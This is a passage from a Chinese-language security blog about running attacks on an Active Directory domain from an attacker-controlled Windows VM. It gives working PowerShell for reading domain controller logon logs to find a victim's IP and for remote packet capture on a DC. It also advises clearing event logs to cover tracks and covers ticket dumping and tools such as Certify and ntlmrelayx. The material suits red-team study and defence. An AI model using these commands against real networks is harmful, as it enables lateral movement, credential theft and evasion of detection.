<h3><span id="windows-事件日志">Windows 事件日志</span></h3><p>如果参与的目标是针对特定用户，且该用户已远程登录到某个服务器，可能可以通过安全事件日志识别该用户的源 IP 地址，从而尝试横向移动到该主机。相同的方法也可以用于域控制器的安全日志，以识别用户身份验证的来源，或者在启用的情况下，识别 TGT（目标票证请求）或 TGS（目标服务票证请求）的请求来源。</p>
<p>Windows 事件日志可以通过 <code>Get-WinEvent</code> 命令，使用 <code>-ComputerName</code> 参数来查询，或者通过事件查看器 MMC 管理单元（<code>eventvwr.exe DC1.ad.bitsadmin.com</code>）或 WMI（<code>Win32_NTLogEvent</code>）来查询。下面是使用 <code>Get-WinEvent</code> 查询域控制器（DC）事件 ID 4768（TGT 请求）的示例，可以用来识别目标用户工作站的 IP 地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @&#123;logname=&quot;Security&quot;;id=4768&#125; | % &#123; [PSCustomObject]@&#123;TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value&#125; &#125; | select -First 1</span><br><span class="line"></span><br><span class="line"> TimeCreated     : 11-07-2023 09:22:41</span><br><span class="line"> TargetUserName    : User1</span><br><span class="line"> TargetDomainName   : AD.BITSADMIN.COM</span><br><span class="line"> TargetSid      : S-1-5-21-1425944706-2951745170-748646788-1168</span><br><span class="line"> ServiceName     : krbtgt</span><br><span class="line"> ServiceSid      : S-1-5-21-1425944706-2951745170-748646788-502</span><br><span class="line"> TicketOptions    : 1082195984</span><br><span class="line"> Status        : 0</span><br><span class="line"> TicketEncryptionType : 18</span><br><span class="line"> PreAuthType     : 2</span><br><span class="line"> IpAddress      : ::ffff:10.0.10.52</span><br><span class="line"> IpPort        : 52994</span><br><span class="line"> CertIssuerName    :</span><br><span class="line"> CertSerialNumber   :</span><br><span class="line"> CertThumbprint    :</span><br></pre></td></tr></table></figure>

<p>可以使用 <code>Clear-EventLog</code> cmdlet 或通过事件查看器 MMC 管理单元来清除事件日志，以掩盖痕迹。</p>
<h3><span id="windows-事件追踪etw抓流量">Windows 事件追踪（ETW，抓流量）</span></h3><p>Windows 事件追踪（ETW）是一种日志机制，事件提供者可以将事件写入 ETW 会话。事件消费者能够监听这些事件并对其进行处理。</p>
<p>一个事件提供者的例子是 Microsoft-Windows-NDIS-PacketCapture，它允许在网络接口上捕获数据包。这样的捕获也可以在远程主机上进行，而无需安装任何工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Initiate CIM session to DC1</span><br><span class="line"> $so = New-CimSessionOption -Protocol Dcom</span><br><span class="line"> $s = New-CimSession -ComputerName DC1.ad.bitsadmin.com -SessionOption $so</span><br><span class="line"></span><br><span class="line"> # Initiate a ETW packet capture session</span><br><span class="line"> New-NetEventSession -Name sess -CimSession $s -LocalFilePath &quot;C:\Windows\Temp\Trace.etl&quot; -CaptureMode SaveToFile</span><br><span class="line"> Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)</span><br><span class="line"> Start-NetEventSession -Name sess -CimSession $s</span><br><span class="line"> Get-NetEventSession -Name sess -CimSession $s</span><br><span class="line"></span><br><span class="line"> #</span><br><span class="line"> # Have the packet capture provider run for a while to collect network traffic</span><br><span class="line"> # In the video below during this time, an authentication takes place against the DC1 host</span><br><span class="line"> #</span><br><span class="line"></span><br><span class="line"> # Stop the packet capture and obtain the trace file</span><br><span class="line"> Stop-NetEventSession -Name sess -CimSession $s</span><br><span class="line"> Remove-NetEventSession -Name sess -CimSession $s</span><br><span class="line"> Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\Tmp</span><br><span class="line"></span><br><span class="line"> # Convert the ETW trace to pcap format and open it</span><br><span class="line"> # etl2pcapng.exe is available at https://github.com/microsoft/etl2pcapng</span><br><span class="line"> etl2pcapng.exe C:\Tmp\Trace.etl C:\Tmp\DC1_Trace.pcapng</span><br><span class="line"> ii C:\Tmp\DC1_Trace.pcapng</span><br></pre></td></tr></table></figure>



<h3><span id="攻击者工具">攻击者工具</span></h3><p>尽管攻击者工具不完全是 LOFLCABs，但根据它们的开发方式，它们可以从 Offensive Windows VM 上用于目标环境。这些工具可以是 .NET 工具、Win32 应用程序或 PowerShell 脚本。只要这些工具底层使用了 Windows 库，这些库会自动处理身份验证，它们就可以用来与 Active Directory 和其他 Windows 系统交互。与使用 Offensive Windows VM 时的其他工具一样，这些工具需要使用目标域或主机的 FQDN。当使用与域交互的工具时，通常需要显式指定域和某些情况下的 LDAP 服务器名称，因为它们无法通过上下文来识别。一个典型的攻击者工具是 SharpHound，它要求指定 –Domain 参数。</p>
<p>如果 .NET 版本的工具无法按预期工作，通常也有一个 Python 版本的工具可以使用。与 .NET 版本不同，Python 工具通常不会假设它们位于域环境中。这些 Python 工具可以从 Linux 路由虚拟机（如同 Offensive Windows VM）使用，该虚拟机通过相同的 SOCKS 隧道进行通信。Python 版本的工具通常需要显式指定目标的所有详细信息，包括（Kerberos）凭证材料（.kirbi），这些材料可以从 Offensive Windows VM 中提取（例如使用 Rubeus 的 <code>dump</code> 命令），然后使用 Impacket 的 <code>ticketConverter.py</code> 脚本将其转换为 ccache 格式。</p>
<p>一个部分可用的攻击者工具示例是 Certify。从 Offensive Windows VM 上，Certify 能够列出有漏洞的证书模板，限制是，对于证书模板的 ACL，显示的是 SID 而不是实际的用户名。然而，当尝试使用有漏洞的模板申请证书时，Certify 在 <code>GetCurrentUserDN()</code> 函数中会抛出一个 NullReferenceException 错误，显然是因为该工具没有在目标域上下文中执行。用于查找证书的命令行需要指定 <code>/domain</code> 和 <code>/ldapserver</code> 参数，例如：<code>certify find /domain:ad.bitsadmin.com /ldapserver:DC1.ad.bitsadmin.com /vulnerable</code>。幸运的是，Certify 也有一个 Python 版本，叫做 CertiPy，由 Oliver Lyak (@ly4k_) 开发，它使用 ccache 文件和目标域可以列出所有有漏洞的证书并能够请求证书。</p>
<p>许多 PowerShell 脚本也可以从 Offensive Windows VM 上运行。一个可以用来收集目标系统详细信息的 PowerShell 脚本是 Dave Hull (@davehull) 的 Kansa，这是一个用于事件响应的 PowerShell 框架。在运行 <code>kansa.ps1</code> 脚本时，重要的是添加 <code>-Authentication Negotiate</code> 标志，强制其使用 Negotiate 身份验证包，如本文第二部分中“准备凭证材料”部分所讨论的那样。如果在 LOFL 环境下用于事件响应时使用 <code>kansa.ps1</code>，尤其重要的是禁用 NTLM 回退功能，正如本文第二部分“Offensive 设置：Offensive Windows VM”部分中所讨论的，以避免将凭证泄漏给可能已被攻击者控制的系统。</p>
<p>一些最适合从 Linux 路由&#x2F;攻击者虚拟机执行的工具示例是中继工具，如 Impacket 的 <code>ntlmrelayx.py</code>。这些工具也需要 C2 软件，通过将端口从运行软件植入的主机重定向到 Linux 路由虚拟机。由于 LOFL 设置，所有中继的外发连接将自动通过 tun2socks 路由，因此不需要使用 <code>proxychains-ng</code>。</p>

	
	</div>
  <a type="button" href="/2024/12/10/OffensiveWindows攻击平台搭建/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
      </li>
    
      <li>
        <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
      </li>
    
      <li>
        <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
      </li>
    
      <li>
        <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
      </li>
    
      <li>
        <a href="/2024/11/29/解密chrome浏览器账号密码/" ><i class="fa fa-file-o"></i>解密chrome浏览器账号密码</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 ShadowMccc's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
